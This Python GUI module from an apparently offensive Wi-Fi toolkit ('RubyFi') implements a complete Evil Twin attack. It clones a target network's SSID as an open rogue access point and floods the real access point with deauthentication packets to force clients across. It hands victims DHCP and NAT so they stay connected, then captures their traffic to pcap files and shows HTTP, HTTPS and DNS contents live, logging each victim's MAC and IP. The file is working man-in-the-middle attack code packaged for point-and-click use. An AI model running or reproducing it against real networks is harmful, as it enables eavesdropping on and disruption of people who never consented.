#!/usr/bin/env python3
"""gui/evil_twin_dialog.py — All Evil Twin-related threads, dialogs, and RubyFiWindow methods."""

import os
import subprocess
import time

from PyQt5.QtWidgets import (
    QDialog, QVBoxLayout, QHBoxLayout, QPushButton, QLabel,
    QWidget, QProgressBar, QTextEdit, QMessageBox
)
from PyQt5.QtCore import Qt, QThread, pyqtSignal, QTimer


# ═══════════════════════════════════════════════════════════════
# THREAD
# ═══════════════════════════════════════════════════════════════

class EvilTwinThread(QThread):
    """Background thread for Evil Twin attack."""
    status_update   = pyqtSignal(str)
    client_connected = pyqtSignal(str, str)   # (mac, ip)
    attack_complete = pyqtSignal(bool, str)

    def __init__(self, interface, bssid, ssid, channel):
        super().__init__()
        self.interface = interface
        self.bssid = bssid
        self.ssid = ssid
        self.channel = channel
        self.running = True
        self.processes = []
        self.rogue_ap_proc = None
        self.deauth_proc = None
        self.dnsmasq_proc = None

    def run(self):
        try:
            self.status_update.emit("🔧 Step 0: Cleaning up old data...")
            self.cleanup_old_leases()

            self.status_update.emit("🔧 Step 1: Starting Rogue AP...")
            if not self.start_rogue_ap():
                self.attack_complete.emit(False, "Failed to start Rogue AP")
                return

            time.sleep(5)

            self.status_update.emit("🔧 Step 2: Configuring network...")
            self.configure_network()

            self.status_update.emit("🔧 Step 3: Enabling internet sharing...")
            self.enable_internet_sharing()

            self.status_update.emit("🔧 Step 4: Starting deauth attack...")
            self.start_deauth()

            self.status_update.emit("✅ Evil Twin attack is ACTIVE!")
            self.status_update.emit("📡 Rogue AP broadcasting...")
            self.status_update.emit(f"📶 SSID: {self.ssid} (OPEN)")
            self.status_update.emit("⚡ Deauth packets sending...")
            self.status_update.emit("🎯 Waiting for clients to connect...")

            time.sleep(2)
            self.monitor_clients()

        except Exception as e:
            self.attack_complete.emit(False, str(e))
        finally:
            self.cleanup()

    def cleanup_old_leases(self):
        try:
            dhcp_lease_file = "/var/lib/misc/dnsmasq.leases"
            if os.path.exists(dhcp_lease_file):
                os.remove(dhcp_lease_file)
                self.status_update.emit("🧹 Cleared old DHCP leases")
            subprocess.run(["ip", "neigh", "flush", "dev", "at0"],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.status_update.emit("🧹 Cleared ARP cache")
        except Exception as e:
            self.status_update.emit(f"⚠️ Cleanup warning: {str(e)}")

    def start_rogue_ap(self) -> bool:
        try:
            self.status_update.emit("🔧 Preparing interface...")

            subprocess.run(["rfkill", "unblock", "all"],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["airmon-ng", "check", "kill"],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(1)

            subprocess.run(["ip", "link", "set", self.interface, "up"],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.status_update.emit(f"✓ Interface {self.interface} is UP")

            subprocess.run(["iw", "dev", self.interface, "set", "channel", str(self.channel)],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.status_update.emit(f"✓ Channel set to {self.channel}")
            time.sleep(1)

            subprocess.run(["ip", "link", "set", "at0", "down"],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["ip", "link", "delete", "at0"],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            self.status_update.emit(f"🚀 Launching Rogue AP: {self.ssid}...")

            cmd = ["airbase-ng", "-e", self.ssid, "-c", str(self.channel), self.interface]
            self.rogue_ap_proc = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
            )
            self.processes.append(self.rogue_ap_proc)

            self.status_update.emit("⏳ Waiting for 'at0' interface...")

            for _ in range(16):
                time.sleep(0.5)
                chk = subprocess.run(["ip", "link", "show", "at0"],
                                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                if chk.returncode == 0:
                    self.status_update.emit("✅ Rogue AP started successfully!")
                    self.status_update.emit(f"📡 Broadcasting SSID: {self.ssid}")
                    self.status_update.emit("📶 Interface: at0 created")
                    return True

                if self.rogue_ap_proc.poll() is not None:
                    try:
                        stderr_output = self.rogue_ap_proc.stderr.read()
                        self.status_update.emit(f"❌ airbase-ng failed: {stderr_output}")
                    except Exception:
                        self.status_update.emit("❌ airbase-ng failed to start")
                    return False

            self.status_update.emit("❌ Timeout: 'at0' interface not created after 8s")
            self.status_update.emit("💡 Tip: Run 'sudo airmon-ng check kill' manually")
            return False

        except Exception as e:
            import traceback
            self.status_update.emit(f"❌ Exception in start_rogue_ap: {str(e)}")
            self.status_update.emit(f"Traceback: {traceback.format_exc()}")
            return False

    def configure_network(self):
        try:
            chk = subprocess.run(["ip", "link", "show", "at0"],
                                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            if chk.returncode != 0:
                self.status_update.emit("❌ Interface 'at0' not found!")
                return

            subprocess.run(["ip", "link", "set", "at0", "up"],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["ip", "addr", "flush", "dev", "at0"],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["ip", "addr", "add", "192.168.100.1/24", "dev", "at0"],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.status_update.emit("✅ Network configured: 192.168.100.1/24")

            subprocess.run(["pkill", "dnsmasq"],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(1)

            cmd = [
                "dnsmasq", "-i", "at0", "-I", "lo",
                "--dhcp-range=192.168.100.10,192.168.100.250,12h",
                "--dhcp-option=3,192.168.100.1",
                "--dhcp-option=6,8.8.8.8",
                "-d"
            ]
            self.dnsmasq_proc = subprocess.Popen(
                cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            self.processes.append(self.dnsmasq_proc)
            self.status_update.emit("✅ DHCP server started (192.168.100.10-250)")

        except Exception as e:
            self.status_update.emit(f"⚠️ Network config error: {str(e)}")

    def start_deauth(self):
        try:
            cmd = f"aireplay-ng --deauth 0 -a {self.bssid} {self.interface}"
            self.deauth_proc = subprocess.Popen(
                cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            self.processes.append(self.deauth_proc)
            self.status_update.emit("✅ Deauth attack started")
        except Exception as e:
            self.status_update.emit(f"⚠️ Deauth error: {e}")

    def monitor_clients(self):
        seen_clients = set()
        monitor_start_time = time.time()
        self.status_update.emit(f"🔍 Monitoring started at {time.strftime('%H:%M:%S')}")

        while self.running:
            try:
                dhcp_lease_file = "/var/lib/misc/dnsmasq.leases"
                if os.path.exists(dhcp_lease_file):
                    try:
                        with open(dhcp_lease_file, 'r') as f:
                            for line in f:
                                if not line.strip():
                                    continue
                                parts = line.strip().split()
                                if len(parts) >= 3:
                                    lease_timestamp = int(parts[0])
                                    mac = parts[1].upper()
                                    ip = parts[2]
                                    if ip == '192.168.100.1':
                                        continue
                                    if lease_timestamp < monitor_start_time:
                                        continue
                                    client_id = f"{mac}:{ip}"
                                    if client_id not in seen_clients:
                                        seen_clients.add(client_id)
                                        self.client_connected.emit(mac, ip)
                    except Exception:
                        pass
                else:
                    result = subprocess.run(["arp", "-an"],
                                            capture_output=True, text=True, timeout=2)
                    if result.returncode == 0:
                        for line in result.stdout.split('\n'):
                            if '192.168.100.' in line and 'at0' in line:
                                try:
                                    parts = line.split()
                                    if len(parts) >= 4:
                                        ip = parts[1].strip('()')
                                        mac = parts[3].upper()
                                        if ip == '192.168.100.1' or '' in mac:
                                            continue
                                        client_id = f"{mac}:{ip}"
                                        if client_id not in seen_clients:
                                            seen_clients.add(client_id)
                                            self.client_connected.emit(mac, ip)
                                except Exception:
                                    pass
                time.sleep(3)
            except Exception:
                time.sleep(3)

    def stop(self):
        self.running = False

    def cleanup(self):
        try:
            dhcp_lease_file = "/var/lib/misc/dnsmasq.leases"
            if os.path.exists(dhcp_lease_file):
                os.remove(dhcp_lease_file)
        except Exception:
            pass

        try:
            subprocess.run(["ip", "neigh", "flush", "dev", "at0"],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception:
            pass

        try:
            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["iptables", "-t", "nat", "-F"],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["iptables", "-F"],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.status_update.emit("✅ IP forwarding disabled")
        except Exception:
            pass

        for proc in self.processes:
            try:
                proc.terminate()
                proc.wait(timeout=2)
            except Exception:
                try:
                    proc.kill()
                except Exception:
                    pass

        subprocess.run("pkill aireplay-ng", shell=True, capture_output=True)
        subprocess.run("pkill airbase-ng",  shell=True, capture_output=True)
        subprocess.run("pkill dnsmasq",     shell=True, capture_output=True)
        subprocess.run("ip link set at0 down 2>/dev/null", shell=True, capture_output=True)

        self.attack_complete.emit(True, "Evil Twin attack stopped")

    def enable_internet_sharing(self):
        try:
            self.status_update.emit("🌐 Enabling internet sharing...")

            internet_iface = self.find_internet_interface()
            if not internet_iface:
                self.status_update.emit("⚠️ No internet interface found")
                self.status_update.emit("⚠️ Clients will connect but have no internet")
                return

            self.status_update.emit(f"🌐 Internet interface: {internet_iface}")

            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.status_update.emit("✅ IP forwarding enabled")

            subprocess.run(["iptables", "-t", "nat", "-F"],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["iptables", "-F"],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            subprocess.run(["iptables", "-t", "nat", "-A", "POSTROUTING",
                            "-o", internet_iface, "-j", "MASQUERADE"],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["iptables", "-A", "FORWARD",
                            "-i", "at0", "-o", internet_iface, "-j", "ACCEPT"],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["iptables", "-A", "FORWARD",
                            "-i", internet_iface, "-o", "at0",
                            "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            self.status_update.emit(f"✅ NAT configured (at0 → {internet_iface})")
            self.status_update.emit("✅ Clients will have internet access!")
            self.start_traffic_monitoring()

        except Exception as e:
            self.status_update.emit(f"⚠️ Internet sharing error: {str(e)}")

    def find_internet_interface(self):
        try:
            result = subprocess.run(["ip", "route", "show", "default"],
                                    capture_output=True, text=True)
            if result.returncode == 0 and result.stdout:
                parts = result.stdout.split()
                if "dev" in parts:
                    dev_index = parts.index("dev")
                    if dev_index + 1 < len(parts):
                        return parts[dev_index + 1]
            for iface in ["eth0", "enp0s3", "ens33", "wlan1", "wlan2"]:
                result = subprocess.run(["ip", "addr", "show", iface],
                                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                if result.returncode == 0:
                    return iface
        except Exception:
            pass
        return None

    def start_traffic_monitoring(self):
        try:
            self.status_update.emit("📊 Starting traffic monitoring...")
            capture_dir = "/tmp/evil_twin_captures"
            os.makedirs(capture_dir, exist_ok=True)

            capture_file = f"{capture_dir}/capture_{int(time.time())}.pcap"
            tcpdump_proc = subprocess.Popen(
                ["tcpdump", "-i", "at0", "-w", capture_file, "-U"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            self.processes.append(tcpdump_proc)
            self.status_update.emit(f"✅ Traffic capture: {capture_file}")

            monitor_cmd_string = "tcpdump -i at0 -n -A \'port 80 or port 443 or port 53\'"
            terminal_commands = [
                ["gnome-terminal", "--", "bash", "-c",
                 f"{monitor_cmd_string}; echo \'Press Enter to close\'; read"],
                ["xfce4-terminal", "--hold", "-e", f"bash -c \'{monitor_cmd_string}\'"],
                ["konsole", "-e", "bash", "-c",
                 f"{monitor_cmd_string}; echo \'Press Enter to close\'; read"],
                ["xterm", "-hold", "-e", monitor_cmd_string],
            ]

            terminal_opened = False
            for cmd in terminal_commands:
                try:
                    subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    self.status_update.emit("✅ Traffic monitor window opened!")
                    self.status_update.emit("📡 Watch HTTP/HTTPS/DNS traffic live")
                    terminal_opened = True
                    break
                except Exception:
                    continue

            if not terminal_opened:
                self.status_update.emit("⚠️ No terminal emulator found")
                self.status_update.emit("💡 Manual: sudo tcpdump -i at0 -n -A \'port 80 or port 443\'")

        except Exception as e:
            self.status_update.emit(f"⚠️ Traffic monitoring error: {str(e)}")


# ═══════════════════════════════════════════════════════════════
# DIALOG
# ═══════════════════════════════════════════════════════════════

class EvilTwinDialog(QDialog):
    """Dialog to select Evil Twin attack mode."""

    def __init__(self, target_ssid: str, target_bssid: str, target_channel: str,
                 interface: str, parent=None):
        super().__init__(parent)
        self.setWindowTitle("🎭 Evil Twin Attack")
        self.setModal(True)
        self.setMinimumSize(550, 350)
        self.target_ssid = target_ssid
        self.target_bssid = target_bssid
        self.target_channel = target_channel
        self.interface = interface
        self.selected_mode = None
        self.init_ui()

    def init_ui(self):
        layout = QVBoxLayout(self)

        header = QLabel("🎭 EVIL TWIN ATTACK")
        header.setAlignment(Qt.AlignmentFlag.AlignCenter)
        header.setStyleSheet("font-size:16px; font-weight:bold; color:#8338ec; margin:15px;")
        layout.addWidget(header)

        info_text = (f"Target: {self.target_ssid}\nBSSID: {self.target_bssid}"
                     f"\nChannel: {self.target_channel}")
        info_label = QLabel(info_text)
        info_label.setStyleSheet(
            "color:#c9d1d9; margin:10px; padding:10px; background:#161b22; border-radius:6px;"
        )
        layout.addWidget(info_label)

        warning = QLabel("⚠️ WARNING: Creates rogue AP for MITM attacks!")
        warning.setAlignment(Qt.AlignmentFlag.AlignCenter)
        warning.setStyleSheet("color:#ff006e; font-weight:bold; margin:10px;")
        layout.addWidget(warning)

        modes = [
            ("🔓 Simple Evil Twin (Open Network + Deauth)", "simple", "#00ff88",
             "Creates open rogue AP\nClients auto-connect when deauthed"),
            ("🔒 Advanced Evil Twin (WPA2 Fake + Deauth)", "advanced", "#8b949e",
             "Coming soon... (WPA2 rogue AP)"),
        ]

        for text, mode_id, color, desc in modes:
            btn = QPushButton(text)
            btn.setMinimumHeight(60)
            if mode_id == "advanced":
                btn.setEnabled(False)
                btn.setStyleSheet("""
QPushButton { background:#161b22; border:2px solid #30363d; color:#8b949e;
  font-size:12px; font-weight:bold; text-align:left; padding-left:20px; border-radius:6px; }
""")
            else:
                btn.setStyleSheet(f"""
QPushButton {{ background:#21262d; border:2px solid {color}; color:{color};
  font-size:12px; font-weight:bold; text-align:left; padding-left:20px; border-radius:6px; }}
QPushButton:hover {{ background:{color}; color:#0d1117; }}
""")
                btn.clicked.connect(lambda checked, mid=mode_id: self.select_mode(mid))
            layout.addWidget(btn)

            desc_label = QLabel(desc)
            desc_label.setStyleSheet("color:#8b949e; font-size:10px; margin-left:30px;")
            layout.addWidget(desc_label)

        layout.addStretch()

        cancel_btn = QPushButton("❌ Cancel")
        cancel_btn.clicked.connect(self.reject)
        cancel_btn.setStyleSheet("""
QPushButton { background:#161b22; border:2px solid #8b949e; color:#8b949e; padding:10px; border-radius:6px; }
QPushButton:hover { background:#8b949e; color:#0d1117; }
""")
        layout.addWidget(cancel_btn)

    def select_mode(self, mode_id):
        self.selected_mode = mode_id
        self.accept()


# ═══════════════════════════════════════════════════════════════
# MIXIN
# ═══════════════════════════════════════════════════════════════

class EvilTwinMixin:
    """
    All Evil-Twin-related RubyFiWindow methods.
    RubyFiWindow must inherit from this alongside QMainWindow.
    Requires self.log(), self.current_interface, self.selected_target,
    self.centralWidget() from RubyFiWindow.
    """

    # ── entry point ──────────────────────────────────────────────
    def execute_evil_twin(self):
        target = self.selected_target

        dialog = EvilTwinDialog(
            target['ssid'], target['bssid'], target['channel'],
            self.current_interface, self
        )
        if dialog.exec() != QDialog.DialogCode.Accepted:
            return

        mode = dialog.selected_mode
        if mode == "simple":
            self.perform_simple_evil_twin(target)
        elif mode == "advanced":
            QMessageBox.information(self, "Coming Soon",
                                    "Advanced Evil Twin will be available soon!")

    # ── launch ───────────────────────────────────────────────────
    def perform_simple_evil_twin(self, target):
        self.log(f"🎭 Launching Evil Twin attack on {target['ssid']}...")
        self.log(f"   BSSID: {target['bssid']}")
        self.log(f"   Channel: {target['channel']}")
        self.log("   Mode: Simple (Open Network + Deauth)")

        try:
            self.evil_stats_panel = self.create_evil_twin_stats_panel()

            self.stop_evil_twin_btn = QPushButton("⏹️ Stop Evil Twin Attack")
            self.stop_evil_twin_btn.setStyleSheet("""
QPushButton { background:#21262d; border:2px solid #8338ec; color:#8338ec; font-weight:bold; padding:10px; border-radius:6px; }
QPushButton:hover { background:#8338ec; color:#0d1117; }
""")
            self.stop_evil_twin_btn.clicked.connect(self.stop_evil_twin)

            layout = self.centralWidget().layout()
            layout.insertWidget(layout.count() - 2, self.evil_stats_panel)
            layout.insertWidget(layout.count() - 2, self.stop_evil_twin_btn)

            self.evil_twin_clients = 0
            self.evil_twin_seen_clients = set()
            self.evil_twin_start_time = time.time()

            self.evil_twin_thread = EvilTwinThread(
                self.current_interface,
                target['bssid'], target['ssid'], int(target['channel'])
            )
            self.evil_twin_thread.status_update.connect(self.update_evil_twin_status)
            self.evil_twin_thread.client_connected.connect(self.on_evil_twin_client)
            self.evil_twin_thread.attack_complete.connect(self.on_evil_twin_complete)
            self.evil_twin_thread.start()

            self.evil_timer = QTimer()
            self.evil_timer.timeout.connect(self.update_evil_twin_time)
            self.evil_timer.start(1000)

        except Exception as e:
            self.log(f"❌ Error: {str(e)}")
            QMessageBox.critical(self, "Error", str(e))

    # ── signal slots ─────────────────────────────────────────────
    def update_evil_twin_status(self, message):
        self.log(message)
        if "Rogue AP started successfully" in message:
            self.ap_status_label.setText("🟢 ONLINE")
            self.ap_status_label.setStyleSheet(
                "color:#00ff88; font-size:24px; font-weight:bold; border:none;"
            )
        elif "Error" in message or "Failed" in message:
            self.ap_status_label.setText("🔴 ERROR")
            self.ap_status_label.setStyleSheet(
                "color:#ff006e; font-size:24px; font-weight:bold; border:none;"
            )

    def update_evil_twin_time(self):
        if hasattr(self, 'evil_twin_start_time'):
            elapsed = int(time.time() - self.evil_twin_start_time)
            mins, secs = divmod(elapsed, 60)
            self.evil_time_label.setText(f"{mins}m {secs}s" if mins > 0 else f"{secs}s")

    def on_evil_twin_client(self, mac, ip):
        client_id = f"{mac.upper()}:{ip}"
        if not hasattr(self, 'evil_twin_seen_clients'):
            self.evil_twin_seen_clients = set()
        if client_id in self.evil_twin_seen_clients:
            return

        self.evil_twin_seen_clients.add(client_id)
        self.evil_twin_clients += 1

        self.evil_clients_label.setText(str(self.evil_twin_clients))

        timestamp = time.strftime("%H:%M:%S")
        self.evil_clients_list.append(f"[{timestamp}] 🟢 {mac} → {ip}")
        self.log(f"🎉 NEW CLIENT #{self.evil_twin_clients}: {mac} → {ip}")

        self.evil_clients_label.setStyleSheet(
            "color:#ffbe0b; font-size:32px; font-weight:bold; border:none;"
        )
        QTimer.singleShot(500, lambda: self.evil_clients_label.setStyleSheet(
            "color:#00ff88; font-size:28px; font-weight:bold; border:none;"
        ))

        try:
            import subprocess as _sp
            _sp.Popen(
                ["paplay", "/usr/share/sounds/freedesktop/stereo/complete.oga"],
                stdout=_sp.DEVNULL, stderr=_sp.DEVNULL
            )
        except Exception:
            pass

    def on_evil_twin_complete(self, success, message):
        if success:
            self.log(f"✅ {message}")
        else:
            self.log(f"❌ Error: {message}")
        self.hide_stop_evil_twin_button()

    # ── stop / cleanup ────────────────────────────────────────────
    def show_stop_evil_twin_button(self):
        """Standalone stop button (fallback if panel not created yet)."""
        self.stop_evil_twin_btn = QPushButton("⏹️ Stop Evil Twin")
        self.stop_evil_twin_btn.setStyleSheet("""
QPushButton { background:#21262d; border:2px solid #8338ec; color:#8338ec; font-weight:bold; padding:10px; border-radius:6px; }
QPushButton:hover { background:#8338ec; color:#0d1117; }
""")
        self.stop_evil_twin_btn.clicked.connect(self.stop_evil_twin)
        layout = self.centralWidget().layout()
        layout.insertWidget(layout.count() - 2, self.stop_evil_twin_btn)

    def stop_evil_twin(self):
        if hasattr(self, 'evil_twin_thread') and self.evil_twin_thread.isRunning():
            self.log("🛑 Stopping Evil Twin attack...")
            self.evil_twin_thread.stop()
            self.evil_twin_thread.wait()
            self.log("✅ Attack stopped")
        self.hide_stop_evil_twin_button()

    def hide_stop_evil_twin_button(self):
        if hasattr(self, 'evil_timer'):
            self.evil_timer.stop()
            del self.evil_timer
        if hasattr(self, 'evil_twin_seen_clients'):
            del self.evil_twin_seen_clients
        if hasattr(self, 'evil_stats_panel'):
            self.evil_stats_panel.deleteLater()
            del self.evil_stats_panel
        if hasattr(self, 'stop_evil_twin_btn'):
            self.stop_evil_twin_btn.deleteLater()
            del self.stop_evil_twin_btn

    # ── stats panel builder ──────────────────────────────────────
    def create_evil_twin_stats_panel(self):
        panel = QWidget()
        panel.setStyleSheet("""
QWidget { background:#161b22; border:2px solid #8338ec; border-radius:8px; padding:10px; }
""")
        layout = QVBoxLayout(panel)

        title = QLabel("🎭 EVIL TWIN ATTACK - LIVE STATUS")
        title.setAlignment(Qt.AlignmentFlag.AlignCenter)
        title.setStyleSheet("color:#8338ec; font-weight:bold; font-size:16px; border:none;")
        layout.addWidget(title)

        stats_layout = QHBoxLayout()

        def _stat_widget(attr, desc_text, init_val, color):
            w = QWidget()
            vl = QVBoxLayout(w)
            vl.setContentsMargins(5, 5, 5, 5)
            val = QLabel(init_val)
            val.setAlignment(Qt.AlignmentFlag.AlignCenter)
            val.setStyleSheet(f"color:{color}; font-size:24px; font-weight:bold; border:none;")
            desc = QLabel(desc_text)
            desc.setAlignment(Qt.AlignmentFlag.AlignCenter)
            desc.setStyleSheet("color:#8b949e; font-size:11px; border:none;")
            vl.addWidget(val)
            vl.addWidget(desc)
            setattr(self, attr, val)
            return w

        stats_layout.addWidget(_stat_widget("ap_status_label",    "Rogue AP Status",    "🔴 OFFLINE", "#ff006e"))
        stats_layout.addWidget(_stat_widget("evil_clients_label", "Clients Connected",  "0",          "#00ff88"))
        stats_layout.addWidget(_stat_widget("evil_time_label",    "Attack Duration",    "0s",         "#ffbe0b"))
        layout.addLayout(stats_layout)

        clients_list_label = QLabel("📱 CONNECTED CLIENTS:")
        clients_list_label.setStyleSheet(
            "color:#00ff88; font-weight:bold; font-size:12px; border:none; margin-top:10px;"
        )
        layout.addWidget(clients_list_label)

        self.evil_clients_list = QTextEdit()
        self.evil_clients_list.setReadOnly(True)
        self.evil_clients_list.setMaximumHeight(100)
        self.evil_clients_list.setStyleSheet("""
QTextEdit { background:#0d1117; border:1px solid #30363d; border-radius:4px;
  color:#c9d1d9; padding:5px; font-family:monospace; }
""")
        layout.addWidget(self.evil_clients_list)

        self.evil_progress = QProgressBar()
        self.evil_progress.setRange(0, 0)
        self.evil_progress.setTextVisible(False)
        self.evil_progress.setStyleSheet("""
QProgressBar { border:1px solid #30363d; border-radius:4px; background:#0d1117; height:8px; }
QProgressBar::chunk { background:qlineargradient(x1:0,y1:0,x2:1,y2:0,
  stop:0 #8338ec,stop:0.5 #ff006e,stop:1 #ffbe0b); border-radius:4px; }
""")
        layout.addWidget(self.evil_progress)

        return panel
